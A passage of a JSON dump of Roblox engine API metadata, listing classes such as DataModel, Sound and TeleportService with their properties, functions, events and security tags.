rovider","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"access","Default":null}],"Name":"SetAccessKey","tags":["RobloxSecurity"],"Class":"ScriptInformationProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAssetUrl","tags":["LocalUserSecurity"],"Class":"ScriptInformationProvider","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"ScriptService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Selection","tags":[]},{"ReturnType":"Objects","Arguments":[],"Name":"Get","tags":["PluginSecurity"],"Class":"Selection","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"selection","Default":null}],"Name":"Set","tags":["PluginSecurity"],"Class":"Selection","type":"Function"},{"Arguments":[],"Name":"SelectionChanged","tags":[],"Class":"Selection","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ServerScriptService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ServerStorage","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ServiceProvider","tags":["notbrowsable"]},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"FindService","tags":[],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"GetService","tags":[],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"getService","tags":["deprecated"],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"service","tags":["deprecated"],"Class":"ServiceProvider","type":"Function"},{"Arguments":[],"Name":"Close","tags":[],"Class":"ServiceProvider","type":"Event"},{"Arguments":[],"Name":"CloseLate","tags":["LocalUserSecurity"],"Class":"ServiceProvider","type":"Event"},{"Arguments":[{"Name":"service","Type":"Instance"}],"Name":"ServiceAdded","tags":[],"Class":"ServiceProvider","type":"Event"},{"Arguments":[{"Name":"service","Type":"Instance"}],"Name":"ServiceRemoving","tags":[],"Class":"ServiceProvider","type":"Event"},{"Superclass":"ServiceProvider","type":"Class","Name":"DataModel","tags":[]},{"ValueType":"int","type":"Property","Name":"CreatorId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"CreatorType","type":"Property","Name":"CreatorType","tags":["readonly"],"Class":"DataModel"},{"ValueType":"GearGenreSetting","type":"Property","Name":"GearGenreSetting","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Genre","type":"Property","Name":"Genre","tags":["readonly"],"Class":"DataModel"},{"ValueType":"bool","type":"Property","Name":"IsPersonalServer","tags":["RobloxScriptSecurity"],"Class":"DataModel"},{"ValueType":"string","type":"Property","Name":"JobId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"bool","type":"Property","Name":"LocalSaveEnabled","tags":["RobloxScriptSecurity","readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"PlaceId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"PlaceVersion","tags":["readonly"],"Class":"DataModel"},{"ValueType":"string","type":"Property","Name":"VIPServerId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"VIPServerOwnerId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"Workspace","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"lighting","tags":["deprecated","readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"workspace","tags":["deprecated","readonly"],"Class":"DataModel"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"displayName","Default":null},{"Type":"string","Name":"stat","Default":null}],"Name":"AddStat","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ClearMessage","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"localSave","Default":null}],"Name":"FinishShutdown","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"jobname","Default":null},{"Type":"double","Name":"greaterThan","Default":null}],"Name":"GetJobIntervalPeakFraction","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"jobname","Default":null},{"Type":"double","Name":"greaterThan","Default":null}],"Name":"GetJobTimePeakFraction","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetJobsExtendedStats","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetJobsInfo","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetMessage","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetRemoteBuildMode","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"bool","Name":"synchronous","Default":"false"}],"Name":"HttpGet","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"bool","Name":"synchronous","Default":"false"},{"Type":"string","Name":"contentType","Default":"*/*"}],"Name":"HttpPost","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"GearType","Name":"gearType","Default":null}],"Name":"IsGearTypeAllowed","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsLoaded","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"url","Default":null}],"Name":"Load","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetID","Default":null}],"Name":"LoadGame","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"LoadPlugins","tags":["RobloxSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetID","Default":null}],"Name":"LoadWorld","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"stat","Default":null}],"Name":"RemoveStat","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"category","Default":null},{"Type":"string","Name":"action","Default":"custom"},{"Type":"string","Name":"label","Default":"none"},{"Type":"int","Name":"value","Default":"0"}],"Name":"ReportInGoogleAnalytics","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"id","Default":null},{"Type":"string","Name":"key1","Default":null},{"Type":"string","Name":"value1","Default":null},{"Type":"string","Name":"key2","Default":null},{"Type":"string","Name":"value2","Default":null}],"Name":"ReportMeasurement","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"url","Default":null}],"Name":"Save","tags":["RobloxSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveStats","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ServerSave","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"creatorID","Default":null},{"Type":"CreatorType","Name":"creatorType","Default":null}],"Name":"SetCreatorID","tags":["PluginSecurity","deprecated"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"creatorId","Default":null},{"Type":"CreatorType","Name":"creatorType","Default":null}],"Name":"SetCreatorId","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"GearGenreSetting","Name":"genreRestriction","Default":null},{"Type":"int","Name":"allowedGenres","Default":null}],"Name":"SetGearSettings","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Genre","Name":"genre","Default":null}],"Name":"SetGenre","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"seconds","Default":null}],"Name":"SetJobsExtendedStatsWindow","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"SetMessage","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetMessageBrickCount","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeID","Default":null},{"Type":"bool","Name":"robloxPlace","Default":"false"}],"Name":"SetPlaceID","tags":["PluginSecurity","deprecated"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"bool","Name":"robloxPlace","Default":"false"}],"Name":"SetPlaceId","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"SetPlaceVersion","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"buildModeEnabled","Default":null}],"Name":"SetRemoteBuildMode","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"info","Default":null}],"Name":"SetScreenshotInfo","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetServerSaveUrl","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"universeId","Default":null}],"Name":"SetUniverseId","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"newId","Default":null}],"Name":"SetVIPServerId","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"newId","Default":null}],"Name":"SetVIPServerOwnerId","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"info","Default":null}],"Name":"SetVideoInfo","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Shutdown","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleTools","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"HttpGetAsync","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"string","Name":"contentType","Default":"*/*"}],"Name":"HttpPostAsync","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"SaveFilter","Name":"saveFilter","Default":"SaveAll"}],"Name":"SavePlace","tags":[],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"SaveToRoblox","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"Arguments":[],"Name":"AllowedGearTypeChanged","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[{"Name":"betterQuality","Type":"bool"}],"Name":"GraphicsQualityChangeRequest","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[{"Name":"object","Type":"Instance"},{"Name":"descriptor","Type":"Property"}],"Name":"ItemChanged","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[],"Name":"Loaded","tags":[],"Class":"DataModel","type":"Event"},{"ReturnType":"Tuple","Arguments":[],"Name":"OnClose","tags":[],"Class":"DataModel","type":"Callback"},{"ReturnType":"bool","Arguments":[],"Name":"RequestShutdown","tags":["RobloxScriptSecurity","noyield"],"Class":"DataModel","type":"Callback"},{"Superclass":"ServiceProvider","type":"Class","Name":"GenericSettings","tags":[]},{"Superclass":"GenericSettings","type":"Class","Name":"GlobalSettings","tags":["notbrowsable"]},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"GetFFlag","tags":[],"Class":"GlobalSettings","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"GetFVariable","tags":[],"Class":"GlobalSettings","type":"Function"},{"ReturnType":"Dictionary","Arguments":[],"Name":"GetFVariables","tags":["RobloxScriptSecurity"],"Class":"GlobalSettings","type":"Function"},{"Superclass":"GenericSettings","type":"Class","Name":"UserSettings","tags":[]},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"IsUserFeatureEnabled","tags":[],"Class":"UserSettings","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Reset","tags":[],"Class":"UserSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Sky","tags":[]},{"ValueType":"bool","type":"Property","Name":"CelestialBodiesShown","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxBk","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxDn","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxFt","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxLf","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxRt","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxUp","tags":[],"Class":"Sky"},{"ValueType":"int","type":"Property","Name":"StarCount","tags":[],"Class":"Sky"},{"Superclass":"Instance","type":"Class","Name":"Smoke","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Smoke"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"Opacity","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"RiseVelocity","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"Smoke"},{"Superclass":"Instance","type":"Class","Name":"SocialService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"bestFriendUrl","Default":null}],"Name":"SetBestFriendUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"friendUrl","Default":null}],"Name":"SetFriendUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"groupRankUrl","Default":null}],"Name":"SetGroupRankUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"groupRoleUrl","Default":null}],"Name":"SetGroupRoleUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"groupUrl","Default":null}],"Name":"SetGroupUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"stuffUrl","Default":null}],"Name":"SetPackageContentsUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"stuffUrl","Default":null}],"Name":"SetStuffUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Sound","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsPaused","tags":["readonly"],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"IsPlaying","tags":["readonly"],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"Looped","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"MaxDistance","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"MinDistance","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"Pitch","tags":[],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"PlayOnRemove","tags":[],"Class":"Sound"},{"ValueType":"Content","type":"Property","Name":"SoundId","tags":[],"Class":"Sound"},{"ValueType":"double","type":"Property","Name":"TimeLength","tags":["readonly"],"Class":"Sound"},{"ValueType":"double","type":"Property","Name":"TimePosition","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"Volume","tags":[],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"isPlaying","tags":["deprecated","readonly"],"Class":"Sound"},{"ReturnType":"void","Arguments":[],"Name":"Pause","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Play","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Stop","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"pause","tags":["deprecated"],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"play","tags":["deprecated"],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"stop","tags":["deprecated"],"Class":"Sound","type":"Function"},{"Arguments":[{"Name":"soundId","Type":"string"},{"Name":"numOfTimesLooped","Type":"int"}],"Name":"DidLoop","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Ended","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Paused","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Played","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Stopped","tags":[],"Class":"Sound","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"SoundService","tags":["notCreatable"]},{"ValueType":"ReverbType","type":"Property","Name":"AmbientReverb","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"DistanceFactor","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"DopplerScale","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"RolloffScale","tags":[],"Class":"SoundService"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetListener","tags":[],"Class":"SoundService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SoundType","Name":"sound","Default":null}],"Name":"PlayStockSound","tags":["RobloxScriptSecurity"],"Class":"SoundService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"ListenerType","Name":"listenerType","Default":null},{"Type":"Tuple","Name":"listener","Default":null}],"Name":"SetListener","tags":[],"Class":"SoundService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Sparkles","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":["hidden"],"Class":"Sparkles"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Sparkles"},{"ValueType":"Color3","type":"Property","Name":"SparkleColor","tags":[],"Class":"Sparkles"},{"Superclass":"Instance","type":"Class","Name":"SpawnerService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StarterGear","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StarterPlayer","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"CameraMaxZoomDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"CameraMinZoomDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"CameraMode","type":"Property","Name":"CameraMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevCameraOcclusionMode","type":"Property","Name":"DevCameraOcclusionMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevComputerCameraMovementMode","type":"Property","Name":"DevComputerCameraMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevComputerMovementMode","type":"Property","Name":"DevComputerMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevTouchCameraMovementMode","type":"Property","Name":"DevTouchCameraMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevTouchMovementMode","type":"Property","Name":"DevTouchMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"bool","type":"Property","Name":"EnableMouseLockOption","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"bool","type":"Property","Name":"LoadCharacterAppearance","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"StarterPlayer"},{"Superclass":"Instance","type":"Class","Name":"StarterPlayerScripts","tags":[]},{"Superclass":"StarterPlayerScripts","type":"Class","Name":"StarterCharacterScripts","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Stats","tags":["notCreatable"]},{"ValueType":"double","type":"Property","Name":"MinReportInterval","tags":["RobloxScriptSecurity"],"Class":"Stats"},{"ValueType":"string","type":"Property","Name":"ReporterType","tags":["RobloxScriptSecurity"],"Class":"Stats"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"category","Default":null},{"Type":"Dictionary","Name":"data","Default":null}],"Name":"Report","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReportJobsStepWindow","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"includeJobs","Default":"false"}],"Name":"ReportTaskScheduler","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetReportUrl","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"StatsItem","tags":[]},{"ReturnType":"double","Arguments":[],"Name":"GetValue","tags":["PluginSecurity"],"Class":"StatsItem","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetValueString","tags":["PluginSecurity"],"Class":"StatsItem","type":"Function"},{"Superclass":"StatsItem","type":"Class","Name":"ProfilingItem","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"double","Name":"window","Default":"0"}],"Name":"GetTimes","tags":["PluginSecurity"],"Class":"ProfilingItem","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"frames","Default":"1"}],"Name":"GetTimesForFrames","tags":["PluginSecurity"],"Class":"ProfilingItem","type":"Function"},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageItemDouble","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageItemInt","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageTimeIntervalItem","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"TotalCountTimeIntervalItem","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StringValue","tags":[]},{"ValueType":"string","type":"Property","Name":"Value","tags":[],"Class":"StringValue"},{"Arguments":[{"Name":"value","Type":"string"}],"Name":"Changed","tags":[],"Class":"StringValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"string"}],"Name":"changed","tags":["deprecated"],"Class":"StringValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"StudioTool","tags":[]},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"StudioTool"},{"Arguments":[],"Name":"Activated","tags":[],"Class":"StudioTool","type":"Event"},{"Arguments":[],"Name":"Deactivated","tags":[],"Class":"StudioTool","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"StudioTool","type":"Event"},{"Arguments":[],"Name":"Unequipped","tags":[],"Class":"StudioTool","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"TaskScheduler","tags":[]},{"ValueType":"bool","type":"Property","Name":"AreArbitersThrottled","tags":[],"Class":"TaskScheduler"},{"ValueType":"ConcurrencyModel","type":"Property","Name":"Concurrency","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumRunningJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumSleepingJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumWaitingJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"PriorityMethod","type":"Property","Name":"PriorityMethod","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"SchedulerDutyCycle","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"SchedulerRate","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"SleepAdjustMethod","type":"Property","Name":"SleepAdjustMethod","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"ThreadAffinity","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"ThreadPoolConfig","type":"Property","Name":"ThreadPoolConfig","tags":[],"Class":"TaskScheduler"},{"ValueType":"int","type":"Property","Name":"ThreadPoolSize","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"ThrottledJobSleepTime","tags":[],"Class":"TaskScheduler"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"exclusive","Default":"true"},{"Type":"double","Name":"fps","Default":"30"}],"Name":"AddDummyJob","tags":["LocalUserSecurity"],"Class":"TaskScheduler","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"timeSlice","Default":null},{"Type":"int","Name":"numShare","Default":null}],"Name":"SetThreadShare","tags":["LocalUserSecurity","deprecated"],"Class":"TaskScheduler","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Team","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoAssignable","tags":[],"Class":"Team"},{"ValueType":"bool","type":"Property","Name":"AutoColorCharacters","tags":["deprecated"],"Class":"Team"},{"ValueType":"int","type":"Property","Name":"Score","tags":["deprecated"],"Class":"Team"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Team"},{"Superclass":"Instance","type":"Class","Name":"Teams","tags":["notCreatable"]},{"ReturnType":"Objects","Arguments":[],"Name":"GetTeams","tags":[],"Class":"Teams","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RebalanceTeams","tags":["deprecated"],"Class":"Teams","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TeleportService","tags":[]},{"ValueType":"bool","type":"Property","Name":"CustomizedTeleportUI","tags":["deprecated"],"Class":"TeleportService"},{"ReturnType":"Variant","Arguments":[],"Name":"GetLocalPlayerTeleportData","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"setting","Default":null}],"Name":"GetTeleportSetting","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"setting","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetTeleportSetting","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"Teleport","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"TeleportCancel","tags":["RobloxScriptSecurity"],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"instanceId","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"string","Name":"spawnName","Default":""},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToPlaceInstance","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"reservedServerAccessCode","Default":null},{"Type":"Objects","Name":"players","Default":null},{"Type":"string","Name":"spawnName","Default":""},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToPrivateServer","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"spawnName","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToSpawnByName","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerPlaceInstanceAsync","tags":[],"Class":"TeleportService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"ReserveServer","tags":[],"Class":"TeleportService","type":"YieldFunction"},{"Arguments":[{"Name":"loadingGui","Type":"Instance"},{"Name":"dataTable","Type":"Variant"}],"Name":"LocalPlayerArrivedFromTeleport","tags":[],"Class":"TeleportService","type":"Event"},{"ReturnType":"bool","Arguments":[{"Name":"message","Type":"string"},{"Name":"placeId","Type":"int"